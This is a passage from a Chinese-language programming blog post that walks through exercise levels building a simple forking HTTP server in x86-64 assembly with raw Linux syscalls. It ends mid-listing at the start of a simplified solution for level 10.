<h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8"></a>level8</h4><p>这一关就是加一个accept调用即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">_start:     </span><br><span class="line">    mov rdi, 2      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=3</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41 </span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # bind(3, &#123;sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16) = 0</span><br><span class="line">    lea rsi, [rip+socket_addr]</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # listen(3, 0) = 0</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # accept(3, NULL, NULL) = 4</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4      # read(4,buf,count_bytes)</span><br><span class="line">    lea rsi, buffer</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    lea rsi, buffer+4</span><br><span class="line">    lea rdi, file_path</span><br><span class="line">loop_start:</span><br><span class="line">    mov al, byte ptr [rsi]</span><br><span class="line">    cmp al, &#x27; &#x27;</span><br><span class="line">    je get_file_path</span><br><span class="line">    mov byte ptr [rdi], al</span><br><span class="line">    inc rdi</span><br><span class="line">    inc rsi</span><br><span class="line">    jmp loop_start</span><br><span class="line"></span><br><span class="line">get_file_path:</span><br><span class="line">    lea rdi, file_path # open(&quot;file_path&quot;, O_RDONLY)</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    mov rdi, 5              # read(the_file,buf,256)</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall </span><br><span class="line">    mov r8, rax</span><br><span class="line"></span><br><span class="line">    mov rdi, 5      # close(5) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4      # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    lea rsi,[rip + ret_normal_msg] </span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4      # write(4, &quot;file_buf&quot;, r8)</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, r8</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4      # close(4) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # accept(3, NULL, NULL) = 4</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,0       # SYS_exit</span><br><span class="line">    mov rax,60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">socket_addr:</span><br><span class="line">    .2byte 2</span><br><span class="line">    .2byte 0x5000</span><br><span class="line">    .4byte 0</span><br><span class="line">    .8byte 0</span><br><span class="line">ret_normal_msg:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">buffer:</span><br><span class="line">    .space 256</span><br><span class="line">file_path:</span><br><span class="line">    .space 64 </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h4><p>这道题要用fork，经过第七题的拷打之后，简单一些了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">_start:     </span><br><span class="line">    mov rdi, 2      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=3</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41 </span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # bind(3, &#123;sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16) = 0</span><br><span class="line">    lea rsi, [rip+socket_addr]</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # listen(3, 0) = 0</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # accept(3, NULL, NULL) = 4</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, 57     # fork()</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    cmp rax, 0</span><br><span class="line">    je child_process</span><br><span class="line">    mov rdi, 4      # close(4)</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # accept(3, NULL, NULL) = 4</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line">    jmp done</span><br><span class="line"></span><br><span class="line">child_process:</span><br><span class="line">    mov rdi, 3      # close(3)</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi, 4      # read(4,buf,count_bytes)</span><br><span class="line">    lea rsi, buffer</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    lea rsi, buffer+4</span><br><span class="line">    lea rdi, file_path</span><br><span class="line">loop_start:</span><br><span class="line">    mov al, byte ptr [rsi]</span><br><span class="line">    cmp al, &#x27; &#x27;</span><br><span class="line">    je get_file_path</span><br><span class="line">    mov byte ptr [rdi], al</span><br><span class="line">    inc rdi</span><br><span class="line">    inc rsi</span><br><span class="line">    jmp loop_start</span><br><span class="line"></span><br><span class="line">get_file_path:</span><br><span class="line">    lea rdi, file_path # open(&quot;file_path&quot;, O_RDONLY)</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    mov rdi, 3              # read(the_file,buf,256)</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall </span><br><span class="line">    mov r8, rax</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # close(5) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4      # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    lea rsi,[rip + ret_normal_msg] </span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4      # write(4, &quot;file_buf&quot;, r8)</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, r8</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4      # close(4) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # accept(3, NULL, NULL) = 4</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,0       # SYS_exit</span><br><span class="line">    mov rax,60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    </span><br><span class="line">.section .data</span><br><span class="line">socket_addr:</span><br><span class="line">    .2byte 2</span><br><span class="line">    .2byte 0x5000</span><br><span class="line">    .4byte 0</span><br><span class="line">    .8byte 0</span><br><span class="line">ret_normal_msg:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">buffer:</span><br><span class="line">    .space 256</span><br><span class="line">file_path:</span><br><span class="line">    .space 64 </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h4><p>这一关，还挺折磨的。对于客户端发来的信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;POST /tmp/tmpgjb407yq HTTP/1.1\r\nHost: localhost\r\nUser-Agent: python-requests/2.32.3\r\nAccept-Encoding: gzip, deflate, zstd\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: 65\r\n\r\nK8rWGbWjWUycQmhKDinJRKVnmTd1ssEfnNbxuzygIK4l1pIVgCGgSx0Kdr3xqIFWK&quot;</span><br></pre></td></tr></table></figure>

<p>需要解析出length和这个随机字符串。因为后续需要通过write写入文件<code>/tmp/xxx</code>。所以，我想到的方法是将这个字符串存入buffer，然后从buffer的最后一个字节开始逆序遍历，到第一个<code>\n</code>停止。这样可以拿到这个随机字符串的逆序，以及用一个寄存器记录一下长度。后续再通过这个长度来再一次逆序这个随机字符串，从而写入<code>/tmp/xxx</code>。最终代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">_start:     </span><br><span class="line">    mov rdi, 2      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=3</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41 </span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # bind(3, &#123;sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16) = 0</span><br><span class="line">    lea rsi, [rip+socket_addr]</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # listen(3, 0) = 0</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # accept(3, NULL, NULL) = 4</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, 57     # fork()</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    cmp rax, 0</span><br><span class="line">    je child_process</span><br><span class="line">    mov rdi, 4      # close(4)</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # accept(3, NULL, NULL) = 4</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line">    jmp done</span><br><span class="line"></span><br><span class="line">child_process:</span><br><span class="line">    mov rdi, 3      # close(3)</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi, 4      # read(4,buf,count_bytes)</span><br><span class="line">    lea rsi, buffer</span><br><span class="line">    mov rdx, 512</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov r8, rax</span><br><span class="line">    lea rsi, buffer+5</span><br><span class="line">    lea rdi, file_path</span><br><span class="line">loop_start:</span><br><span class="line">    mov al, byte ptr [rsi]</span><br><span class="line">    cmp al, 0x20</span><br><span class="line">    je get_file_path</span><br><span class="line">    mov byte ptr [rdi], al</span><br><span class="line">    inc rdi</span><br><span class="line">    inc rsi</span><br><span class="line">    jmp loop_start</span><br><span class="line"></span><br><span class="line">get_file_path:</span><br><span class="line">    lea rdi, file_path  # open(&quot;file_path&quot;, O_WRONLY|O_CREAT, 0777)</span><br><span class="line">    mov rsi, 01|0100</span><br><span class="line">    mov rdx, 0x1FF</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rbx, 0</span><br><span class="line">    lea rdi, content</span><br><span class="line">    dec r8</span><br><span class="line"></span><br><span class="line">loop2_start:</span><br><span class="line">    mov al, byte ptr [buffer + r8]</span><br><span class="line">    cmp al, 0xa</span><br><span class="line">    je get_content_str</span><br><span class="line">    mov byte ptr [rdi], al</span><br><span class="line">    inc rdi</span><br><span class="line">    dec r8</span><br><span class="line">    inc rbx</span><br><span class="line">    jmp loop2_start</span><br><span class="line"></span><br><span class="line">get_content_str:</span><br><span class="line">    lea rdi, reverse_content</span><br><span class="line">    mov r9, rbx</span><br><span class="line">    dec r9</span><br><span class="line">    mov rcx, 0</span><br><span class="line">loop3_start:</span><br><span class="line">    mov al, byte ptr [content + r9]</span><br><span class="line">    cmp rcx, rbx</span><br><span class="line">    je get_reverse_str</span><br><span class="line">    mov byte ptr [rdi], al</span><br><span class="line">    inc rdi</span><br><span class="line">    inc rcx</span><br><span class="line">    dec r9</span><br><span class="line">    jmp loop3_start</span><br><span class="line">get_reverse_str:</span><br><span class="line">    mov rdi, 3      # write(3, content, content_length)</span><br><span class="line">    lea rsi, reverse_content</span><br><span class="line">    mov rdx, rbx</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    mov rdi, 3      # close(3) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4      # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    lea rsi,[rip + ret_normal_msg] </span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,0       # SYS_exit</span><br><span class="line">    mov rax,60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">socket_addr:</span><br><span class="line">    .2byte 2</span><br><span class="line">    .2byte 0x5000</span><br><span class="line">    .4byte 0</span><br><span class="line">    .8byte 0</span><br><span class="line">ret_normal_msg:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">buffer:</span><br><span class="line">    .space 512</span><br><span class="line">file_path:</span><br><span class="line">    .space 64 </span><br><span class="line">content:</span><br><span class="line">    .space 256</span><br><span class="line">reverse_content:</span><br><span class="line">    .space 256</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>总共三个循环，还是挺复杂的。主要是有更简单的方法。<code>!</code>使用<code>\n</code>的索引即可。如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">_start:     </span><br><span class="line">    mov rdi, 2      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=3</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41 </span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # bind(3, &#123;sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16) = 0</span><br><span class="line">    lea rsi, [rip+socket_addr]</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # listen(3, 0) = 0</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # accept(3, NULL, NULL) = 4</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, 57     # fork()</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    cmp rax, 0</span><br><span class="line">    je child_process</span><br><span class="line">    mov rdi, 4      # close(4)</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # accept(3, NULL, NULL) = 4</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line">    jmp done</span><br><span class="line"></span><br><span class="line">child_process:</span><br><span class="line">    mov rdi, 3      # close(3)</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi, 4      # read(4,buf,count_bytes)</span><br><span class="line">    lea rsi, buffer</span><br><span class="line">    mov rdx, 512</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov r10, rax</span><br><span class="line">    lea rsi, buffer+5</span><br><span class="line">    lea rdi, file_path</span><br><span class="line">loop_start:</span><br><span class="line">    mov al, byte ptr [rsi]</span><br><span class="line">    cmp al, 0x20</span><br><span class="line">    je get_file_path</span><br><span class="line">    mov byte ptr [rdi], al</span><br><span class="line">    inc rdi</span><br><span class="line">    inc rsi</span><br><span class="line">    jmp loop_start</span><br><span class="line"></span><br><span class="line">get_file_path:</span><br><span class="line">    lea rdi, file_path  # open(&quot;file_path&quot;, O_WRONLY|O_CREAT, 0777)</span><br><span class="line">    mov rsi, 01|0100</span><br><span class="line">    mov rdx, 0x1FF</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line">    mov r12, 8</span><br><span class="line">    mov r8, 0</span><br><span class="line">    mov r9, 0</span><br><span class="line">    lea rsi, 